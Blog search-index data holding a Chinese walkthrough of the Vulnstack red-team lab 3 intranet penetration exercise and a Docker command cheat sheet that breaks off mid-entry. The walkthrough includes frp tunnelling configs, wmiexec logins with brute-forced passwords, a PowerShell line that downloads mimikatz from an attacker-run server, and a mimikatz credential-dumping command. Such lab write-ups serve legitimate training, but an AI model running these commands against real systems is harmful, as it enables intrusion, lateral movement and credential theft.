<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红日安全红队靶场（三）一次简单的内网渗透</title>
      <link href="2021/07/25/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>2021/07/25/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="红日安全红队靶场（三）一次简单的内网渗透"><a href="#红日安全红队靶场（三）一次简单的内网渗透" class="headerlink" title="红日安全红队靶场（三）一次简单的内网渗透"></a>红日安全红队靶场（三）一次简单的内网渗透</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本文首发在个人公众号：白帽技术与网络安全</span><br></pre></td></tr></table></figure><h2 id="靶场介绍及配置"><a href="#靶场介绍及配置" class="headerlink" title="靶场介绍及配置"></a>靶场介绍及配置</h2><p>这是红日团队的第三套靶场（靶场下载地址见文末），本次靶场渗透涉及<strong>敏感信息泄露、暴力破解、脏牛提权、内网穿透、端口转发、以及域渗透</strong>等多种知识点。该靶场环境由5台机器组成，其中包括3台Windows机器和两台Linux机器。</p><p>靶场拓扑如下：</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image002.png" alt="img"></p><p><strong>网卡配置</strong></p><p>在虚拟机的网络编辑器中添加两个host only网卡,ip段分别为192.168.1.0/24和192.168.93.0/24</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image004.jpg" alt="img"></p><h2 id="服务器渗透"><a href="#服务器渗透" class="headerlink" title="服务器渗透"></a>服务器渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><strong>端口扫描</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap -T4 -sC -sV 192.168.1.110</span><br></pre></td></tr></table></figure><p>端口扫描发现外网服务器开启了22、80、3306端口,初步判断开启了SSH、HTTP和MySQL的数据库服务。既然这样那就先访问一下80端口</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image006.jpg" alt="img"></p><p>这里首先访问一下80端口，发现使用的是joomla CMS。（推荐一个谷歌插件：Wappalyzer）</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image008.jpg" alt="img"></p><p>知道是joomla了，那就使用msf的auxiliary/scanner/http/joomla_version模块扫一下看看版本。Joomla版本探测显示版本为3.9.12。</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image012.jpg" alt="img"></p><p>知道版本号之后就可以在网上的各大漏洞库（文末有常用的漏洞库链接）中搜索一下，是否存在可以利用的漏洞。由于唯一可用的rce需要管理员的账户和密码遂继续搜集信息。</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image014.jpg" alt="img"></p><p><strong>目录扫描</strong></p><p>接下来使用dirsearch进行目录扫描，发现了网站的后台==/administrator/==和一个==configuration.php~==文件</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image016.jpg" alt="img"></p><p>先访问一下robots.txt，发现的信息和扫描结果差不多</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image018.jpg" alt="img"></p><p>访问网站的后台发现一个登录框，使用burp suite抓包简单跑了一下，没跑出来。</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image020.jpg" alt="img"></p><p>接下来继续看一下配置文件都有什么</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image022.jpg" alt="img"></p><p>在配置文件中发现了数据库的账号和密码testuser/cvcvgjASD!@,于是使用工具连接数据库，成功！</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image024.jpg" alt="img"></p><p>拿到了数据库下一步就是要想办法添加一个账户，查看数据库后发现密码是加密存储的。由于加密算法未知，于是还得求助于搜索引擎。不得不说，Google yyds!　根据joomla的官方文档成功的添加一个用户admin2/serect。</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image026.jpg" alt="img"></p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image028.jpg" alt="img"></p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image030.jpg" alt="img"></p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image032.jpg" alt="img"></p><p>使用刚刚添加的用户成功登录到了后台</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image034.jpg" alt="img"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>在后台寻找到一处可以上传php的地方，直接上传我祖传的冰蝎马~</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image036.jpg" alt="img"></p><p>连接成功</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image038.jpg" alt="img"></p><p>试了一下无法执行命令，发现disable_functions禁用了一些可以执行命令或代码的函数。</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image040.jpg" alt="img"></p><p>Disable_functions</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image042.jpg" alt="img"></p><p>虽然无法执行命令但是可以浏览文件，那就先翻一翻文件。最后在/tmp/mysql/下发现一个test.txt文件，并在其中发现了账号密码。</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image044.jpg" alt="img"></p><p>由于服务器开启了SSH服务于是尝试登录一下，成功！经过简单信息搜集发现这是一台双网卡机器，并且内核较老，可以使用脏牛漏洞提权。</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image046.jpg" alt="img"></p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用ftp上传提权脚本</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image048.jpg" alt="img"></p><p>执行提权脚本</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image050.jpg" alt="img"></p><p>提权成功。常用的脏牛提权脚本是生成firefart用户，我这里用的脚本直接覆盖了root用户的密码，将root用户的密码修改成了自己设定的123456。</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image052.jpg" alt="img"></p><p>双网卡</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image054.jpg" alt="img"></p><h3 id="代理搭建"><a href="#代理搭建" class="headerlink" title="代理搭建"></a>代理搭建</h3><p>为了方便内网渗透在这里搭建一个frp代理</p><p>frpc.ini配置如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.1.128　　＃kali的IP地址</span><br><span class="line">server_port &#x3D; 17000</span><br><span class="line">token &#x3D; 1q2w3e </span><br><span class="line">pool_count &#x3D; 5        </span><br><span class="line">protocol &#x3D; tcp                #协议类型</span><br><span class="line">health_check_type &#x3D; tcp</span><br><span class="line">health_check_interval_s &#x3D; 100</span><br><span class="line">[test] </span><br><span class="line">remote_port &#x3D; 10000           #代理的端口</span><br><span class="line">plugin &#x3D; socks5               #使用的协议</span><br><span class="line">use_encryption &#x3D; true         #是否加密</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>frps.ini配置如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0        #绑定的ip，为本机</span><br><span class="line">bind_port &#x3D; 17000          #绑定的端口</span><br><span class="line">dashboard_addr &#x3D; 0.0.0.0   #管理地址</span><br><span class="line">dashboard_port &#x3D; 27500     #管理端口</span><br><span class="line">dashboard_user &#x3D; root      #管理的用户名</span><br><span class="line">dashboard_pwd  &#x3D; toor    #管理用户的密码</span><br><span class="line">token &#x3D; 1q2w3e             #客户端服务端连接的密码</span><br><span class="line">heartbeat_timeout &#x3D; 90     #心跳超时时间</span><br><span class="line">max_pool_count &#x3D; 5         #最大同时连接数</span><br></pre></td></tr></table></figure><p>在kali上启动frp server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image056.jpg" alt="img"></p><p>在linux上启动frp client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image060.jpg" alt="img"></p><p>在本机上配置proxifier</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image062.jpg" alt="img"></p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image064.jpg" alt="img"></p><p>测试代理</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image066.jpg" alt="img"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><p>使用MSF的==auxiliary/scanner/smb/smb_version==模块扫内网的存活主机，发现内网存在域名为TEST的三台域内主机，分别是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win7 192.168.93.30&#x2F;24</span><br><span class="line">不知名机器 192.168.93.20&#x2F;24</span><br><span class="line">Windows server 2012 R2 192.168.93.10&#x2F;24</span><br><span class="line">（那台不知名机器其他大佬测的时候都是server 2008）</span><br></pre></td></tr></table></figure><h3 id="口令爆破"><a href="#口令爆破" class="headerlink" title="口令爆破"></a>口令爆破</h3><p>接下来使用smb_login模块爆破smb服务。在这一步，网上好多大佬都说使用了自己top10000的字典跑出了密码。非常巧，在我的top10000字典中恰好没有这个密码（所以为了伪装成一个大佬我就手动把密码加了进去~）</p><p>跑出了两台机器192.168.93.30/192.168.93.20的密码都是123qwe!ASD</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image068.jpg" alt="img"></p><p>既然拿到了密码，接下来就可以使用wmiexec获取一个shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\wmiexec_windows.exe administrator:123qwe!ASD@192.168.93.20</span><br><span class="line"></span><br><span class="line"># WMI的全名为“Windows Management Instrumentation”。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。从Windows 98开始，Windows操作系统都支持WMI。利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。</span><br></pre></td></tr></table></figure><p>执行ipconfig /all发现dns服务器为192.168.93.10，初步判断域控就是这台Windows 2012</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image070.jpg" alt="img"></p><p>看了一下进程列表没有发现杀软进程</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image072.jpg" alt="img"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>因为内网主机不出网所以将mimikatz上传到Linux机器上，在Linux上使用python启动一个http服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure><p>在Windows server2008上使用powershell下载到本地并执行，这里有一个问题就是使用wmiexec获取到的只是一个半交互的shell，所以mimikatz执行的结果需要保存在日志中方便读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.93.100:8888&#x2F;kiwikatz.exe&#39;,&#39;C:\mimikatz.exe&#39;)</span><br></pre></td></tr></table></figure><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image074.jpg" alt="img"></p><p>执行后查看日志发现抓到了域控的明文口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log privilege::debug sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image076.jpg" alt="img"></p><p>使用wmiexec连接域控</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image078.jpg" alt="img"></p><p>最终在C:\Users\Adminisreator\Documents\目录下找到flag.txt</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image080.jpg" alt="img"></p><p>Capture the flag! 收工！</p><p><img src="%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.assets/clip_image082.jpg" alt="img"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说这个靶场环境的渗透并不算难，但是在第一次做的时候依旧花费了一天的时间。在这之后又按照网上各位大佬渗透思路做了几次，每一次都有一些新的收获。</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>靶场地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;5&#x2F;</span><br></pre></td></tr></table></figure><p>漏洞库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.comhttps:&#x2F;&#x2F;www.pwnwiki.org&#x2F;http:&#x2F;&#x2F;wiki.peiqi.tech&#x2F;https:&#x2F;&#x2F;github.com&#x2F;EdgeSecurityTeam&#x2F;Vulnerability</span><br></pre></td></tr></table></figure><p>浏览器插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;chrome.google.com&#x2F;webstore&#x2F;detail&#x2F;wappalyzer&#x2F;gppongmhjkpfnbhagpmjfkannfbllamg?utm_source&#x3D;chrome-ntp-icon</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker常用命令速查</title>
      <link href="2021/07/23/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/"/>
      <url>2021/07/23/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker常用命令速查"><a href="#Docker常用命令速查" class="headerlink" title="Docker常用命令速查"></a>Docker常用命令速查</h1><h2 id="1-查看镜像"><a href="#1-查看镜像" class="headerlink" title="1. 查看镜像"></a><strong>1. 查看镜像</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure><h2 id="2-查看容器"><a href="#2-查看容器" class="headerlink" title="2.查看容器"></a><strong>2.查看容器</strong></h2><p>查看运行中的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container ls</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>添加-a参数，查看所有已经创建的容器，包括已经停止的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h2 id="3-搜索镜像"><a href="#3-搜索镜像" class="headerlink" title="3.搜索镜像"></a>3.搜索镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search tomcat</span><br></pre></td></tr></table></figure><p>search可以搜索指定名称和仓库的镜像。</p><h2 id="3-从dockerhub拉取镜像"><a href="#3-从dockerhub拉取镜像" class="headerlink" title="3.从dockerhub拉取镜像"></a><strong>3.从dockerhub拉取镜像</strong></h2><p>这里以redis镜像为例，我们选择基于alpine基础镜像的版本，体积较小</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull redis:6.0.9-alpine3.12</span><br></pre></td></tr></table></figure><h2 id="4-运行镜像（创建容器）"><a href="#4-运行镜像（创建容器）" class="headerlink" title="4.运行镜像（创建容器）"></a><strong>4.运行镜像（创建容器）</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --rm --name myredis -p 6380:6379 redis:6.0.9-alpine3.12 redis-server</span><br></pre></td></tr></table></figure><p>通过上面的命令，我们创建了redis的容器，可以通过<code>docker ps</code>查看到运行中的容器。</p><p>参数讲解：</p><p><strong>–detach , -d</strong> 容器后台运行，并打印容器ID</p><p><strong>–rm</strong> 如果已经有同名的容器，移除同名容器</p><p><strong>–name</strong> 